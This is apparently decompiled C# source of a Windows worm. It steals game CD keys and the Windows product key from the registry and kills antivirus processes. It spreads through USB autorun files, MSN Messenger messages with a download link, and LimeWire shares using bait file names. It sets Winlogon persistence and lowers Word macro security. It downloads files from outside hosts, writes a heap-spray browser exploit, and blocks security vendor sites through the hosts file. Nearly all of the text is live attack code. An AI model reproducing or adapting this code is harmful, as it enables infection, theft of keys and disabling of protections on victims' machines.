using System;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using MessengerAPI;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using My;

[DesignerGenerated]
public class Form1 : Form
{
	private IContainer components;

	private Array bla;

	private string version;

	private Socket _ClientSocket;

	private Socket _HostSocket;

	private TcpListener _TcpListener;

	private string nameho;

	private Mutex objMutex;

	private string ProgrammFiles;

	private string yourmutex;

	private string bf2;

	private string mb;

	private string baf2;

	private string coh;

	private string supc;

	private string bf42;

	private string cacg;

	private string sims3;

	private string COD;

	private string COD2;

	private string COD4;

	private string COD5;

	private string HL;

	private string CS;

	private string Win;

	private string link;

	private const string DotNet = "http://MSDOTNET.notlong.com";

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		version = Conversions.ToString(2);
		_TcpListener = new TcpListener(5124);
		nameho = Dns.GetHostName();
		ProgrammFiles = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
		yourmutex = "pcquad-yourmothersucks";
		bf2 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\LucasArts\\Star Wars Battlefront\\2.0\\CD Key", "", "E_NotFound"));
		mb = Conversions.ToString(Registry.GetValue("HKEY_CURRENT_USER\\SOFTWARE\\MountAndBladeKeys\\serial_key", "", "E_NotFound"));
		baf2 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\Battlefield 2\\ergc", "", "E_NotFound"));
		coh = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\THQ\\Company Of Heroes\\ProductKey", "", "E_NotFound"));
		supc = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\THQ\\Gas Powered Games\\Supreme Commander\\KEY", "", "E_NotFound"));
		bf42 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA GAMES\\Battlefield 1942\\ergc", "", "E_NotFound"));
		cacg = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA GAMES\\Command and Conquer Generals Zero Hour\\ergc", "", "E_NotFound"));
		sims3 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\Sims\\The Sims 3\\ergc", "", "E_NotFound"));
		COD = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\ACTIVISION\\Call of Duty", "", "E_NotFound"));
		COD2 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\ACTIVISION\\Call of Duty2", "", "E_NotFound"));
		COD4 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\ACTIVISION\\Call of Duty4", "", "E_NotFound"));
		COD5 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\ACTIVISION\\Call of Duty WAW", "", "E_NotFound"));
		HL = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Valve\\Half-Life\\Settings", "", "E_NotFound"));
		CS = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Valve\\CounterStrike\\Settings", "", "E_NotFound"));
		Win = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\", "", "DigitalProductId"));
		link = "http://h1.ripway.com/server.exe";
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(292, 266);
		((Form)this).set_ClientSize(clientSize);
		((Control)this).set_Enabled(false);
		((Control)this).set_ImeMode((ImeMode)2);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Text("Form1");
		((Control)this).ResumeLayout(false);
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int RegisterHotKey(IntPtr Hwnd, int ID, int Modifiers, int Key);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern void Sleep(long dwMilliseconds);

	private object limewirepfadfun()
	{
		string text = Conversions.ToString(((ServerComputer)MyProject.Computer).get_Registry().GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\LimeWire\\", "Shared", (object)0));
		text.Replace("\\", "/");
		object result = default(object);
		return result;
	}

	public void MSN_Share_drop()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		int num5 = default(int);
		string fullyQualifiedName = default(string);
		string[] directories = default(string[]);
		Module module = default(Module);
		string text = default(string);
		int upperBound = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 311:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_0019;
						case 4:
							goto IL_0023;
						case 5:
							goto IL_0040;
						case 6:
							goto IL_005c;
						case 7:
							goto IL_0061;
						case 8:
							goto IL_0064;
						case 9:
							goto IL_006f;
						case 10:
							goto IL_0084;
						case 11:
							goto IL_00a1;
						case 12:
							goto IL_00ba;
						case 13:
						case 14:
						case 15:
							goto IL_00d2;
						default:
							goto end_IL_0000;
						case 16:
						case 17:
							goto end_IL_0000_2;
						}
						goto default;
					}
					IL_00d2:
					num = 15;
					num5 = checked(num5 + 1);
					goto IL_007f;
					IL_00ba:
					num = 12;
					File.Copy(fullyQualifiedName, directories[num5] + "\\mypornpics.scr");
					goto IL_00d2;
					IL_0009:
					num = 2;
					module = Assembly.GetExecutingAssembly().GetModules()[0];
					goto IL_0019;
					IL_0019:
					num = 3;
					fullyQualifiedName = module.FullyQualifiedName;
					goto IL_0023;
					IL_0023:
					num = 4;
					text = "C:\\Documents and Settings\\" + Interaction.Environ("USERNAME") + "\\Local Settings\\Application Data\\Microsoft\\Messenger\\";
					goto IL_0040;
					IL_0040:
					num = 5;
					if (Operators.CompareString(FileSystem.Dir(text, (FileAttribute)16), "", false) == 0)
					{
						goto end_IL_0000_2;
					}
					goto IL_005c;
					IL_005c:
					num = 6;
					num5 = 0;
					goto IL_0061;
					IL_0061:
					num = 7;
					goto IL_0064;
					IL_0064:
					num = 8;
					directories = Directory.GetDirectories(text);
					goto IL_006f;
					IL_006f:
					num = 9;
					upperBound = directories.GetUpperBound(0);
					num5 = 0;
					goto IL_007f;
					IL_007f:
					if (num5 > upperBound)
					{
						goto end_IL_0000_2;
					}
					goto IL_0084;
					IL_0084:
					num = 10;
					if (Operators.CompareString(FileSystem.Dir(directories[num5], (FileAttribute)16), "", false) != 0)
					{
						goto IL_00a1;
					}
					goto IL_00d2;
					IL_00a1:
					num = 11;
					if (!File.Exists(directories[num5] + "\\mypornpics.scr"))
					{
						goto IL_00ba;
					}
					goto IL_00d2;
					end_IL_0000:
					break;
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 311;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public void killall()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				if (Operators.CompareString(Strings.UCase(processes[i].ProcessName), Strings.UCase("av"), false) != 0)
				{
					continue;
				}
				processes[i].Kill();
				if (Operators.CompareString(Strings.UCase(processes[i].ProcessName), Strings.UCase("hijackthis"), false) != 0)
				{
					continue;
				}
				processes[i].Kill();
				if (Operators.CompareString(Strings.UCase(processes[i].ProcessName), Strings.UCase("sample"), false) != 0)
				{
					continue;
				}
				processes[i].Kill();
				if (Operators.CompareString(Strings.UCase(processes[i].ProcessName), Strings.UCase("outpost"), false) != 0)
				{
					continue;
				}
				processes[i].Kill();
				if (Operators.CompareString(Strings.UCase(processes[i].ProcessName), Strings.UCase("npfmsg"), false) != 0)
				{
					continue;
				}
				processes[i].Kill();
				if (Operators.CompareString(Strings.UCase(processes[i].ProcessName), Strings.UCase("bdagent"), false) != 0)
				{
					continue;
				}
				processes[i].Kill();
				if (Operators.CompareString(Strings.UCase(processes[i].ProcessName), Strings.UCase("kavsvc"), false) != 0)
				{
					continue;
				}
				processes[i].Kill();
				if (Operators.CompareString(Strings.UCase(processes[i].ProcessName), Strings.UCase("egui"), false) == 0)
				{
					processes[i].Kill();
					if (Operators.CompareString(Strings.UCase(processes[i].ProcessName), Strings.UCase("zlclient"), false) == 0)
					{
						processes[i].Kill();
					}
				}
			}
		}
	}

	public void msn_spread()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0012: Expected O, but got Unknown
		//IL_0021: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Expected O, but got Unknown
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_002e: Invalid comparison between Unknown and I4
		Messenger val = (Messenger)new MessengerClass();
		IMessengerContacts val2 = (IMessengerContacts)((IMessenger3)val).get_MyContacts();
		IEnumerator enumerator = default(IEnumerator);
		try
		{
			enumerator = val2.GetEnumerator();
			while (enumerator.MoveNext())
			{
				IMessengerContact val3 = (IMessengerContact)enumerator.Current;
				if ((int)val3.get_Status() != 1 && !val3.get_Blocked())
				{
					((IMessenger3)val).InstantMessage((object)val3.get_SigninName());
					SendKeys.SendWait("steal msn passwords:" + link);
					SendKeys.SendWait("{ENTER}");
					SendKeys.SendWait("{ESC}");
				}
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
	}

	private void P2Pspread()
	{
		try
		{
			string text = "windows_7full.scr";
			File.Copy(Application.get_ExecutablePath(), Conversions.ToString(Operators.ConcatenateObject(limewirepfadfun(), (object)text)));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			string text2 = "windows_7full.scr";
			File.Copy(Application.get_ExecutablePath(), Interaction.Environ("programfiles\\Shared\\" + text2));
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	public void Form1_Load(object sender, EventArgs e)
	{
		//IL_2738: Unknown result type (might be due to invalid IL or missing references)
		objMutex = new Mutex(initiallyOwned: false, yourmutex);
		if (!objMutex.WaitOne(0, exitContext: false))
		{
			objMutex.Close();
			objMutex = null;
			ProjectData.EndApp();
		}
		string programFiles = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_ProgramFiles();
		string[] logicalDrives = Directory.GetLogicalDrives();
		string[] array = logicalDrives;
		checked
		{
			for (int i = 0; i < array.Length; i++)
			{
				programFiles = array[i];
				((Control)this).Hide();
				try
				{
					Directory.CreateDirectory(programFiles + "recycler\\S-1-5-21-8749679017-0950430147-468708784-3200");
					File.Copy(Application.get_ExecutablePath(), programFiles + "recycler\\S-1-5-21-8749679017-0950430147-468708784-3200\\recycler.scr");
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				try
				{
					DirectoryInfo directoryInfo = new DirectoryInfo("C:\\WINDOWS\\system32\\dllcache");
					directoryInfo.Attributes = FileAttributes.Normal;
					File.Copy(Application.get_ExecutablePath(), "C:\\WINDOWS\\system32\\dllcache\\recycled.exe");
					File.Copy(Application.get_ExecutablePath(), "C:\\WINDOWS\\system32\\dllcache\\myporn.scr");
					File.Copy(Application.get_ExecutablePath(), "C:\\WINDOWS\\system32\\dllcache\\doc.pif");
					File.Copy(Application.get_ExecutablePath(), "C:\\windows\\system32\\drivers\\svchost.exe");
					directoryInfo.Attributes = FileAttributes.Hidden;
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
				try
				{
					StreamWriter streamWriter = new StreamWriter(programFiles + "autorun.inf");
					streamWriter.WriteLine("[autorun]");
					streamWriter.WriteLine("open=recycler\\S-1-5-21-8749679017-0950430147-468708784-3200\\recycler.scr");
					streamWriter.WriteLine("shellexecute=recycler\\S-1-5-21-8749679017-0950430147-468708784-3200\\recycler.scr");
					streamWriter.WriteLine("shell\\Explore\\command=recycler\\S-1-5-21-8749679017-0950430147-468708784-3200\\recycler.scr");
					streamWriter.WriteLine("shell\\Open\\command=recycler\\S-1-5-21-8749679017-0950430147-468708784-3200\\recycler.scr");
					streamWriter.WriteLine("Shell\\open\\default=Explore");
					streamWriter.WriteLine("Shell=Explore");
					streamWriter.Close();
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
				}
				try
				{
					FileStream stream = new FileStream(programFiles + "recycler\\S-1-5-21-8749679017-0950430147-468708784-3200\\desktop.ini", FileMode.Create, FileAccess.Write);
					StreamWriter streamWriter2 = new StreamWriter(stream);
					streamWriter2.BaseStream.Seek(0L, SeekOrigin.End);
					streamWriter2.WriteLine("[.ShellClassInfo]");
					streamWriter2.WriteLine("CLSID={645FF040-5081-101B-9F08-00AA002F954E}");
					streamWriter2.Close();
				}
				catch (Exception projectError4)
				{
					ProjectData.SetProjectError(projectError4);
					ProjectData.ClearProjectError();
				}
				try
				{
					File.SetAttributes(programFiles + "autorun.inf", FileAttributes.Hidden);
					File.SetAttributes(programFiles + "recycler\\S-1-5-21-8749679017-0950430147-468708784-3200\\recycler.scr", FileAttributes.Hidden);
					File.SetAttributes("C:\\windows\\system32\\winlogon.scr", FileAttributes.Hidden);
				}
				catch (Exception projectError5)
				{
					ProjectData.SetProjectError(projectError5);
					ProjectData.ClearProjectError();
				}
				try
				{
					File.SetAttributes(programFiles + "recycler\\S-1-5-21-8749679017-0950430147-468708784-3200\\desktop.ini", FileAttributes.Hidden);
					DirectoryInfo directoryInfo2 = new DirectoryInfo(programFiles + "recycler");
					directoryInfo2.Attributes = FileAttributes.Hidden;
					DirectoryInfo directoryInfo3 = new DirectoryInfo(programFiles + "recycler\\S-1-5-21-8749679017-0950430147-468708784-3200");
					directoryInfo3.Attributes = FileAttributes.Hidden;
				}
				catch (Exception projectError6)
				{
					ProjectData.SetProjectError(projectError6);
					ProjectData.ClearProjectError();
				}
			}
			((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\9.0\\Word\\Security", "Level", (object)"0");
			((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\10.0\\Word\\Security", "Level", (object)"0");
			((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa", "UAC", (object)"C:\\WINDOWS\\system32\\dllcache\\svchost.exe");
			((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\OLE", "UAC", (object)"C:\\windows\\system32\\drivers\\svchost.exe");
			((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "Shell", (object)"explorer.exe, C:\\windows\\system32\\drivers\\svchost.exe");
			((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "UIHost", (object)"logonui.exe, C:\\WINDOWS\\system32\\dllcache\\recycled.exe");
			Sleep(70000L);
			FileStream stream2 = new FileStream("C:\\windows\\system32\\net.vbs", FileMode.Create, FileAccess.Write);
			StreamWriter streamWriter3 = new StreamWriter(stream2);
			streamWriter3.BaseStream.Seek(0L, SeekOrigin.End);
			streamWriter3.WriteLine("strComputer =\".\"");
			streamWriter3.WriteLine("Set objWMIService = GetObject(\"winmgmts:\"_ ");
			streamWriter3.WriteLine("& \"{impersonationLevel=impersonate}!\\\\\" & strComputer & \"\\root\\cimv2\")");
			streamWriter3.WriteLine("Set colShares = objWMIService.ExecQuery(\"Select * from Win32_Share\")");
			streamWriter3.WriteLine("For each objShare in colShares ");
			streamWriter3.WriteLine("Stuff = objShare.Path ");
			streamWriter3.WriteLine("Set myFSO = CreateObject(\"Scripting.FileSystemObject\") ");
			streamWriter3.WriteLine("Set WriteStuff = myFSO.OpenTextFile(\"C:\\windows\\system32\\logg.txt\", 8, True)");
			streamWriter3.WriteLine("WriteStuff.WriteLine(Stuff) ");
			streamWriter3.WriteLine("WriteStuff.Close ");
			streamWriter3.WriteLine("SET WriteStuff = NOTHING ");
			streamWriter3.WriteLine("Next ");
			streamWriter3.Close();
			FileStream stream3 = new FileStream("C:\\windows\\system32\\launch.vbs", FileMode.Create, FileAccess.Write);
			StreamWriter streamWriter4 = new StreamWriter(stream3);
			streamWriter4.BaseStream.Seek(0L, SeekOrigin.End);
			streamWriter4.WriteLine("Dim oShell");
			streamWriter4.WriteLine("Set oShell = WScript.CreateObject (\"WScript.Shell\")");
			streamWriter4.WriteLine("oShell.run \"C:\\windows\\system32\\launch.bat\",0,True");
			streamWriter4.WriteLine("Set oShell = Nothing ");
			streamWriter4.Close();
			try
			{
				((ServerComputer)MyProject.Computer).get_Network().DownloadFile("http://pcquad.de/Interop.MessengerAPI.dll", "C:\\WINDOWS\\system32\\drivers\\Interop.MessengerAPI.dll");
				((ServerComputer)MyProject.Computer).get_Network().DownloadFile("http://pcquad.de/Interop.MessengerAPI.dll", "C:\\WINDOWS\\system32\\dllcache\\Interop.MessengerAPI.dll");
			}
			catch (Exception projectError7)
			{
				ProjectData.SetProjectError(projectError7);
				ProjectData.ClearProjectError();
			}
			try
			{
				((ServerComputer)MyProject.Computer).get_Network().DownloadFile("http://pcquad.de/last.txt", "C:\\WINDOWS\\system32\\pptemp.txt");
			}
			catch (Exception projectError8)
			{
				ProjectData.SetProjectError(projectError8);
				ProjectData.ClearProjectError();
			}
			StreamReader streamReader = new StreamReader("C:\\WINDOWS\\system32\\pptemp.txt");
			string text = streamReader.ReadToEnd();
			streamReader.Close();
			FileStream stream4 = new FileStream("C:\\windows\\system32\\tmp.dll", FileMode.Create, FileAccess.Write);
			StreamWriter streamWriter5 = new StreamWriter(stream4);
			streamWriter5.BaseStream.Seek(0L, SeekOrigin.End);
			streamWriter5.WriteLine("<script language=\"JavaScript\">");
			streamWriter5.WriteLine("var c=\"" + link + "\");");
			streamWriter5.WriteLine("var array = new Array();");
			streamWriter5.WriteLine("var ls = 0x100000-(c.length*2+0x01020);");
			streamWriter5.WriteLine("var b = unescape(\"%u0C0C%u0C0C\");");
			streamWriter5.WriteLine("while(b.length<ls/2) { b+=b;}");
			streamWriter5.WriteLine("var lh = b.substring(0,ls/2);");
			streamWriter5.WriteLine("delete b;");
			streamWriter5.WriteLine("for(i=0; i<0xC0; i++) { ");
			streamWriter5.WriteLine("\tarray[i] = lh + c;");
			streamWriter5.WriteLine("}");
			streamWriter5.WriteLine("CollectGarbage();");
			streamWriter5.WriteLine("var s1=unescape(\"%u0b0b%u0b0bAAAAAAAAAAAAAAAAAAAAAAAAA\");");
			streamWriter5.WriteLine("var a1 = new Array();");
			streamWriter5.WriteLine("for(var x=0;x<1000;x++) a1.push(document.createElement(\"img\"));");
			streamWriter5.WriteLine("function ok() {");
			streamWriter5.WriteLine("\to1=document.createElement(\"tbody\");");
			streamWriter5.WriteLine("\to1.click;");
			streamWriter5.WriteLine("\tvar o2 = o1.cloneNode();");
			streamWriter5.WriteLine("\to1.clearAttributes();");
			streamWriter5.WriteLine("\to1=null; CollectGarbage();");
			streamWriter5.WriteLine("\tfor(var x=0;x<a1.length;x++) a1[x].src=s1;");
			streamWriter5.WriteLine("\to2.click;");
			streamWriter5.WriteLine("}");
			streamWriter5.WriteLine("</script><script>window.setTimeout(\"ok();\",800);</script>");
			streamWriter5.Close();
			FileStream stream5 = new FileStream("C:\\windows\\system32\\launch.bat", FileMode.Create, FileAccess.Write);
			StreamWriter streamWriter6 = new StreamWriter(stream5);
			streamWriter6.BaseStream.Seek(0L, SeekOrigin.End);
			streamWriter6.WriteLine("@echo off & break off");
			streamWriter6.WriteLine("echo 127.0.0.1 antivir.de >>%windir%\\system32\\drivers\\etc\\hosts");
			streamWriter6.WriteLine("echo 127.0.0.1 www.antivir.de >>%windir%\\system32\\drivers\\etc\\hosts");
			streamWriter6.WriteLine("echo 127.0.0.1 symantec.com >>%windir%\\system32\\drivers\\etc\\hosts");
			streamWriter6.WriteLine("echo 127.0.0.1 www.symantec.com >>%windir%\\system32\\drivers\\etc\\hosts");
			streamWriter6.WriteLine("echo 127.0.0.1 fsecure.com >>%windir%\\system32\\drivers\\etc\\hosts");
			streamWriter6.WriteLine("echo 127.0.0.1 www.fsecure.com >>%windir%\\system32\\drivers\\etc\\hosts");
			streamWriter6.WriteLine("echo 127.0.0.1 www.symantec.com >%windir%\\system32\\drivers\\etc\\hosts");
			streamWriter6.WriteLine("echo 127.0.0.1 securityresponse.symantec.com >>%windir%\\system32\\drivers\\etc\\hosts");
			streamWriter6.WriteLine("echo 127.0.0.1 symantec.com >>%windir%\\system32\\drivers\\etc\\hosts");
			streamWriter6.WriteLine("echo 127.0.0.1 www.sophos.com >>%windir%\\system32\\drivers\\etc\\hosts");
			streamWriter6.WriteLine("echo 127.0.0.1 sophos.com >>%windir%\\system32\\drivers\\etc\\hosts");
			streamWriter6.WriteLine("echo 127.0.0.1 www.mcafee.com >>%windir%\\system32\\drivers\\etc\\hosts");
			streamWriter6.WriteLine("echo 127.0.0.1 mcafee.com >>%windir%\\system32\\drivers\\etc\\hosts");
			streamWriter6.WriteLine("echo 127.0.0.1 liveupdate.symantecliveupdate.com >>%windir%\\system32\\drivers\\etc\\hosts");
			streamWriter6.WriteLine("echo 127.0.0.1 www.viruslist.com >>%windir%\\system32\\drivers\\etc\\hosts");
			streamWriter6.WriteLine("echo 127.0.0.1 viruslist.com >>%windir%\\system32\\drivers\\etc\\hosts");
			streamWriter6.WriteLine("echo 127.0.0.1 f-secure.com >>%windir%\\system32\\drivers\\etc\\hosts");
			streamWriter6.WriteLine("echo 127.0.0.1 www.f-secure.com >>%windir%\\system32\\drivers\\etc\\hosts");
			streamWriter6.WriteLine("echo 127.0.0.1 kaspersky.com >>%windir%\\system32\\drivers\\etc\\hosts");
			streamWriter6.WriteLine("echo 127.0.0.1 www.avp.com >>%windir%\\system32\\drivers\\etc\\hosts");
			streamWriter6.WriteLine("echo 127.0.0.1 www.kaspersky.com >>%windir%\\system32\\drivers\\etc\\hosts");
			streamWriter6.WriteLine("echo 127.0.0.1 avp.com >>%windir%\\system32\\drivers\\etc\\hosts");
			streamWriter6.WriteLine("echo 127.0.0.1 www.networkassociates.com >>%windir%\\system32\\drivers\\etc\\hosts");
			streamWriter6.WriteLine("echo 127.0.0.1 networkassociates.com >>%windir%\\system32\\drivers\\etc\\hosts");
			streamWriter6.WriteLine("echo 127.0.0.1 www.ca.com ca.com >>%windir%\\system32\\drivers\\etc\\hosts");
			streamWriter6.WriteLine("echo 127.0.0.1 mast.mcafee.com >>%windir%\\system32\\drivers\\etc\\hosts");
			streamWriter6.WriteLine("echo 127.0.0.1 my-etrust.com >>%windir%\\system32\\drivers\\etc\\hosts");
			streamWriter6.WriteLine("echo 127.0.0.1 www.my-etrust.com >>%windir%\\system32\\drivers\\etc\\hosts");
			streamWriter6.WriteLine("echo 127.0.0.1 download.mcafee.com >>%windir%\\system32\\drivers\\etc\\hosts");
			streamWriter6.WriteLine("echo 127.0.0.1 dispatch.mcafee.com >>%windir%\\system32\\drivers\\etc\\hosts");
			streamWriter6.WriteLine("echo 127.0.0.1 secure.nai.com >>%windir%\\system32\\drivers\\etc\\hosts");
			streamWriter6.WriteLine("echo 127.0.0.1 nai.com >>%windir%\\system32\\drivers\\etc\\hosts");
			streamWriter6.WriteLine("echo 127.0.0.1 www.nai.com >>%windir%\\system32\\drivers\\etc\\hosts");
			streamWriter6.WriteLine("echo 127.0.0.1 update.symantec.com >>%windir%\\system32\\drivers\\etc\\hosts");
			streamWriter6.WriteLine("echo 127.0.0.1 updates.symantec.com >>%windir%\\system32\\drivers\\etc\\hosts");
			streamWriter6.WriteLine("echo 127.0.0.1 us.mcafee.com >>%windir%\\system32\\drivers\\etc\\hosts");
			streamWriter6.WriteLine("echo 127.0.0.1 liveupdate.symantec.com >>%windir%\\system32\\drivers\\etc\\hosts");
			streamWriter6.WriteLine("echo 127.0.0.1 customer.symantec.com >>%windir%\\system32\\drivers\\etc\\hosts");
			streamWriter6.WriteLine("echo 127.0.0.1 rads.mcafee.com >>%windir%\\system32\\drivers\\etc\\hosts");
			streamWriter6.WriteLine("echo 127.0.0.1 trendmicro.com >>%windir%\\system32\\drivers\\etc\\hosts");
			streamWriter6.WriteLine("echo 127.0.0.1 www.microsoft.com >>%windir%\\system32\\drivers\\etc\\hosts");
			streamWriter6.WriteLine("echo 127.0.0.1 www.trendmicro.com >>%windir%\\system32\\drivers\\etc\\hosts");
			streamWriter6.WriteLine("echo 127.0.0.1 metalhead2005.info >>%windir%\\system32\\drivers\\etc\\hosts");
			streamWriter6.WriteLine("echo 127.0.0.1 www.symantec.com>>c:\\windows\\system32\\Drivers\\Etc\\Hosts");
			streamWriter6.WriteLine("echo 127.0.0.1 www.sophos.com>>c:\\windows\\system32\\Drivers\\Etc\\Hosts");
			streamWriter6.WriteLine("echo 127.0.0.1 www.avast.com>>c:\\windows\\system32\\Drivers\\Etc\\Hosts");
			streamWriter6.WriteLine("echo 127.0.0.1 www.mcafee.com>>c:\\windows\\system32\\Drivers\\Etc\\Hosts");
			streamWriter6.WriteLine("echo 127.0.0.1 www.f-prot.com>>c:\\windows\\system32\\Drivers\\Etc\\Hosts");
			streamWriter6.WriteLine("echo 127.0.0.1 www.f-secure.com>>c:\\windows\\system32\\Drivers\\Etc\\Hosts");
			streamWriter6.WriteLine("echo 127.0.0.1 www.avp.com>>c:\\windows\\system32\\Drivers\\Etc\\Hosts");
			streamWriter6.WriteLine("echo 127.0.0.1 www.kaspersky.com>>c:\\windows\\system32\\Drivers\\Etc\\Hosts");
			streamWriter6.WriteLine("echo 127.0.0.1 www.bitdefender.com>>c:\\windows\\system32\\Drivers\\Etc\\Hosts");
			streamWriter6.WriteLine("echo 127.0.0.1 www.my-etrust.com>>c:\\windows\\system32\\Drivers\\Etc\\Hosts");
			streamWriter6.WriteLine("echo 127.0.0.1 www.eset.com>>c:\\windows\\system32\\Drivers\\Etc\\Hosts");
			streamWriter6.WriteLine("echo 127.0.0.1 www.norman.com>>c:\\windows\\system32\\Drivers\\Etc\\Hosts");
			streamWriter6.WriteLine("echo 127.0.0.1 www.grisoft.com>>c:\\windows\\system32\\Drivers\\Etc\\Hosts");
			streamWriter6.WriteLine("echo nzm_bot.exe >%windir%\\system32\\13l.dll");
			streamWriter6.WriteLine("echo msn_plus.exe >>%windir%\\system32\\13l.dll");
			streamWriter6.WriteLine("echo Icq_hack.exe >>%windir%\\system32\\13l.dll");
			streamWriter6.WriteLine("echo worm_generator.exe >>%windir%\\system32\\13l.dll");
			streamWriter6.WriteLine("echo Command&conquer_Generals.exe >>%windir%\\system32\\13l.dll");
			streamWriter6.WriteLine("echo Worldofwarcraft_crack.exe >>%windir%\\system32\\13l.dll");
			streamWriter6.WriteLine("echo ea_games-cdkey.exe >>%windir%\\system32\\13l.dll");
			streamWriter6.WriteLine("echo skype_unlimited.exe >>%windir%\\system32\\13l.dll");
			streamWriter6.WriteLine("echo 1000_worm_sources.exe >>%windir%\\system32\\13l.dll");
			streamWriter6.WriteLine("echo Windows7_withSerial.exe >>%windir%\\system32\\13l.dll");
			streamWriter6.WriteLine("echo Windows_Vista+Windows_7.exe >>%windir%\\system32\\13l.dll");
			streamWriter6.WriteLine("echo WindowsVistaultimate.exe >>%windir%\\system32\\13l.dll");
			streamWriter6.WriteLine("echo Vista_ultimate.exe >>%windir%\\system32\\13l.dll");
			streamWriter6.WriteLine("echo WinXp.exe >>%windir%\\system32\\13l.dll");
			streamWriter6.WriteLine("echo WinXPpro.exe >>%windir%\\system32\\13l.dll");
			streamWriter6.WriteLine("echo every_youpornvid.pif >>%windir%\\system32\\13l.dll");
			streamWriter6.WriteLine("echo Warcraft3+expansion.exe >>%windir%\\system32\\13l.dll");
			streamWriter6.WriteLine("echo bitdefender+crack.exe >>%windir%\\system32\\13l.dll");
